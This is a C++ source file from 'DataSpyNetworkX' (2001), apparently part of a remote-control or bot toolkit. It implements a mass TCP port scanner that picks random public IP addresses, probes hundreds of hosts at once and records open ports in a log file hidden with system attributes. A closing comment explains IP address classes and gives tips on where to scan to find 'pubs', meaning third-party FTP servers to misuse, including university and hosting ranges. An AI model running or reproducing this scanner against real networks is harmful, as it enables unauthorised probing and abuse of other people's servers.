/* 
	DataSpyNetworkX - DataSpy2k@Hotmail.com  Copyright (C) 2001 DataSpy
	Release Source 0.4Beta.

	In no event will the author be held liable for any damages arising from the use of this code. 

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/
#include "..\include\options.h"
#include "..\include\globals.h"
#include "..\include\base.h"
#include "..\include\tcp.h"
#include "..\include\portscan.h"
#include <stdio.h>
#include <time.h>

BOOL gbPSCAN = FALSE;
DWORD g_dwPortScanTID=0;
HANDLE g_hPortScanThread=NULL;

/* Only scan 

!10.*
!127.*
!192.*

Class A - 1.0.0.1 to 127.255.255.254
Class B - 128.0.0.1 to 191.255.255.254
Class C - 192.0.0.1 to 223.255.255.254

*/
unsigned long RandIP(unsigned long startip)
{
	int	coo=0,ib=0;

	if (!startip)
	{
		redo:
		coo = Random(0,65535);

		for (ib=0;ib<coo;ib++)
		{
			startip += Random(0,65535);
		}
	}

	if(	(startip < 16777217) || (startip > 3758096382) ||
		((startip >= 2130706433) && (startip <= 2147483649)) ||
		((startip >= 167772161) && (startip <= 184549377)) ||
		((startip >= 3232235521) && (startip <= 3238002689 )) )
	{
		if (coo) goto redo;
		if (!coo) return 1;
	}
	if (coo) return startip;
	if (!coo) return 0;

	/*
	16777217 	= 1.0.0.1
	2130706433  	= 127.0.0.1
	2147483649 	= 128.0.0.1
	167772161 	= 10.0.0.1
	184549377 	= 11.0.0.1
	3232235521 	= 192.168.0.1
	3238002689 	= 193.0.0.1
	3758096382 	= 223.255.255.254
	*/
}


DWORD WINAPI PortScanThread(LPVOID lpArgs)
{
	int port = ((PScan *)lpArgs)->port;
	char *cLogFile = ((PScan *)lpArgs)->clogfile;
	unsigned long lip = ((PScan *)lpArgs)->startip;
	int iseconds = ((PScan *)lpArgs)->seconds;
	
	if(!lip) lip = RandIP(0);


/*
	WORD WSock_ver=MAKEWORD(2,0);
	WSADATA WSock_dat;
	WSAStartup(WSock_ver,&WSock_dat);
*/
	HANDLE lFile = CreateFile(cLogFile,GENERIC_WRITE,0,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL);
	DWORD dwWrite=0;
	if(lFile==INVALID_HANDLE_VALUE) {
		return 1;
	}
	SetFilePointer(lFile,0,NULL,FILE_END);
	
	
	char *cStart = new char[256],*start = new char[32],*sstart = new char[32];

	IN_ADDR Erm;
	Erm.S_un.S_addr = ntohl(lip);

	sprintf (cStart,"\r\nDSNX PortScanner - Started on %s %s. Scanning from: %s:%i\r\n\0",_strtime(start),_strdate(sstart),inet_ntoa(Erm),port);
	
	//fwrite(cStart,lstrlen(cStart),1,lFile);
	WriteFile(lFile,cStart,lstrlen(cStart),&dwWrite,NULL);

	unsigned long timm = 0;
	unsigned long iscanned=0,ifound=0;
	if (iseconds) timm = GetTickCount();

	
#define MAX_SIMULTANIOUS_PORTSCAN_SOCKETS 768
#define PORTSCAN_WAIT 2048

	SOCKET The_Sockets[MAX_SIMULTANIOUS_PORTSCAN_SOCKETS];

	SOCKADDR_IN connecting;
	IN_ADDR found;
	
	connecting.sin_family=AF_INET;
	connecting.sin_port = htons(port);
	
	//lip = ntohl(inet_addr("126.255.224.1"));
	
	int iconnect=0,iopen=0;//,iwait = ((PORTSCAN_WAIT / MAX_SIMULTANIOUS_PORTSCAN_SOCKETS) / 2) ;

	DWORD dwLen;	
	fd_set rfds;
	TIMEVAL tm; 
	tm.tv_sec=0; 
	tm.tv_usec=0;//iwait;
	
	gbPSCAN = TRUE;

	while (gbPSCAN)
	{
		for (int init = 0; init < MAX_SIMULTANIOUS_PORTSCAN_SOCKETS; init ++)
		{	
			The_Sockets[init]=socket(AF_INET,SOCK_STREAM,0);
			if(The_Sockets[init] == INVALID_SOCKET) { 
				return 1; 
			}
			ioctlsocket(The_Sockets[init],FIONBIO,&dwLen);
		}
		
		for (iconnect =0;iconnect < MAX_SIMULTANIOUS_PORTSCAN_SOCKETS;iconnect++)
		{
			connecting.sin_addr.S_un.S_addr = htonl(lip);

			connect(The_Sockets[iconnect],(LPSOCKADDR)&connecting,sizeof(SOCKADDR_IN));

			//char *cool = inet_ntoa(Destination.sin_addr );
			//Sleep(iwait);
			
			lip++;
			iscanned++;
			

		}
		
		Sleep(PORTSCAN_WAIT);
	
		for (iopen =0;iopen < MAX_SIMULTANIOUS_PORTSCAN_SOCKETS;iopen++)
		{

			FD_ZERO(&rfds);
			FD_SET(The_Sockets[iopen],&rfds);
			tm.tv_sec=0; 
			tm.tv_usec=0;
		
			if(select(0,NULL,&rfds,NULL,&tm)>0)  //found one
			{
					SOCKADDR sname;
	
					int coolio = sizeof(sname);
					getpeername (The_Sockets[iopen],&sname,&coolio);
					memcpy(&found.S_un.S_addr,&sname.sa_data[2],4);
					
					sprintf(cStart,"Found open port : %s at %s\r\n",inet_ntoa(found),_strtime(start));
					WriteFile(lFile,cStart,lstrlen(cStart),&dwWrite,NULL);
					ifound++;
			}
				
			closesocket(The_Sockets[iopen]);
			//Sleep(iwait); Cause we have set tm to 2 miliseconds
		}

		if( timm) if ((GetTickCount() - timm) /1000 > iseconds) break; //check to see if our times up...
		if (RandIP(lip)) lip = RandIP(0); // check to see were still scannin valid ip's
	}

	sprintf (cStart,"\r\nConcluded %s %s.\r\nScanned %lu hosts and found %lu open ports.\r\n\0",_strtime(start),_strdate(sstart),iscanned,ifound);
		
	WriteFile(lFile,cStart,lstrlen(cStart),&dwWrite,NULL);
	
	delete cStart,sstart,start;
	CloseHandle(lFile);
	g_hPortScanThread=NULL;
	
	return 0;

}


BOOL StartPortScan(PScan *scanner)
{
	g_hPortScanThread=CreateThread(NULL,0,PortScanThread,(LPVOID)scanner,0,&g_dwPortScanTID);
				
	int iWat=0;
	while (gbPSCAN==FALSE && iWat < 26)
	{
		Sleep(100);
		iWat++;
	}
	
	if (gbPSCAN == TRUE)
		return TRUE;
	else
		return FALSE;
}

BOOL StopPortScanning()
{
	gbPSCAN = FALSE;
	
	int iWat=0;
	while (g_hPortScanThread != NULL && iWat < 26)
	{
		Sleep(100);
		iWat++;
	}
	if (g_hPortScanThread == NULL)
		return TRUE;
	else
		return FALSE;

}

/*
IP addresses are: 

32 bits in size.

Grouped into 8-bit bytes or octets.

Decimal digits, separated by dots, occurring at the octet boundaries e.g. X.X.X.X.

Divided into two portions - a network portion and a host portion.

Range from 1.0.0.1 – 255.255.255.254 theoretically

IP addresses are also divided up into classes depending on the first number in the address. There are 5 different classes that IP’s are divided up into. They are as follows:


Class A - The first octet of the IP address is used for the network portion, and the last three octets are used for the host portion

Class A - ranges from 1 to 127
For Example: A network owns every available IP in the range of the first octet. (1.xxx.xxx.xxx) all the possible valid combinations of the xxx’s are owned by a single network. So there are only 126 different Class A ranges possible total.

Class A - 1.0.0.1 to 127.255.255.254

Class B - The first two octets of the IP address are used for the network portion, and the last two octets are used for the host portion. 

Class B - ranges from 128 to 191
For Example: A network owns every available IP in the range of the first 2 octets. (128.1.xxx.xxx) all the possible valid combinations of the xxx’s are owned by a single network. There are 16384 possible Class B ranges.

Class B - 128.0.0.1 to 191.255.255.254

Class C - The first three octets of the IP address are used for the network portion, and the last octet is used for the host portion. 

Class C - ranges from 192 to 223
For Example: A network owns every available IP in the range of the first 3 octets. (192.1.1.xxx) all the possible valid combinations of the xxx’s are owned by a single network. There are 2097152 possible Class C ranges. 

Class C - 192.0.0.1 to 223.255.255.254

Class D - Class D addresses are special addresses used for a special type of IP packet transmitting called Multicasting.

Class D - 224.0.0.1 to 239.255.255.254

Class E - This class of network address is reserved for experimental purposes by the Internet Engineering Task Force. 

Class E - 240.0.0.1 to 254.255.255.254 
 

REMEMBER!!!!


Only Classes A, B, and C are valid for use when giving a host an IP address.
Also the powers that be usually distribute the numbers sequentially, so start low and work up from there. (ex. There are no computers that are in the Class A range 120.xxx.xxx.xxx)

The majority of servers that are used for pubs are ones that are owned by companies that host web pages. Those usually fall in the Class C ranges, more specifically for the US, 206.xxx.xxx.xxx 207.xxx.xxx.xxx 208.xxx.xxx.xxx 209.xxx.xxx.xxx and 216.xxx.xxx.xxx, so scanning ranges is these areas are your best bet if you really don’t want to do any previous research. Another method that has proven productive is to start with the URL of a fast web hosting facility. Normally a search on one of the major engines will produce plenty of results to try. Also the URL of a known high traffic web site (ex. www.yahoo.com, www.pepsi.com etc. but don’t use those because they have been scanned already =)) is a good place to start. Use some sort of lookup program to give you the hosts IP and go from there. Along the lines of both of those suggestions falls the one that I tend to use the most. Using some sort of trace route program (I prefer Neotrace, find the host of a particular domains service and find the name of the network that is the source for their service. This method takes practice in knowing how far back to go from the original IP. Go back too far and more than likely you will be on one of the Backbone networks IP systems (would be fast but there are almost no servers on those networks).

Most universities have fast connections to the Internet for research and teaching purposes and most universities own Class B ranges (128-191) so either scanning these ranges or doing lookups on www.your_uni_here.edu can produce some good results although scanning university ranges has its associated dangers (will be covered in section 3). Also university ranges have the honor of being the most common place to find servers that are using some sort of resident FXPable ftp client (such as SunOS). Some of the largest and oldest universities also own Class A ranges usually in the 30-40 range. When it comes to the end of the day you are going to get a better return off the Class C ranges than any others but the servers that you find on the Class B and Class A ranges will probably be faster and more useful. 

A third way to decide where to scan is to get the IP’s of pubs that you know to be fast and go from there. This is not the best way because more than likely that area had already been scanned.

*/

